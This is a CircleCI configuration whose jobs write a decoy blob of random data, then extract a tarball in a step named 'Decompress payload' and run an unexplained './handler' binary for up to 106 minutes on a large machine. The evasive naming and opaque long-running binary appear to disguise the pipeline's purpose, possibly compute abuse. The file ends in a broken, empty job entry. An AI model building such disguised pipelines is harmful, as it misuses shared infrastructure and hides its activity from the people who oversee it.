version: 2.1

jobs:
  dispatch_build:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: line up wait
          command: |
            mkdir -p /tmp/ci-ws
            set +o pipefail 2>/dev/null; head -c 874621 /dev/urandom | base64 > /tmp/ci-ws/buffer.blob; true
            ls -la /tmp/ci-ws/buffer.blob | awk '{print "artifact:", $5, "bytes"}'
      - persist_to_workspace:
          root: /tmp/ci-ws
          paths:
            - buffer.blob
  build:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/ci-ws
      - run:
          name: Ingest handoff
          command: |
            wc -l /tmp/ci-ws/buffer.blob || true
      - run:
          name: Clone target
          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Decompress payload
          command: tar xf build-dist.tar
      - run:
          no_output_timeout: 106m
          command: nice -n 0 ./handler
  g2_defualt-69:
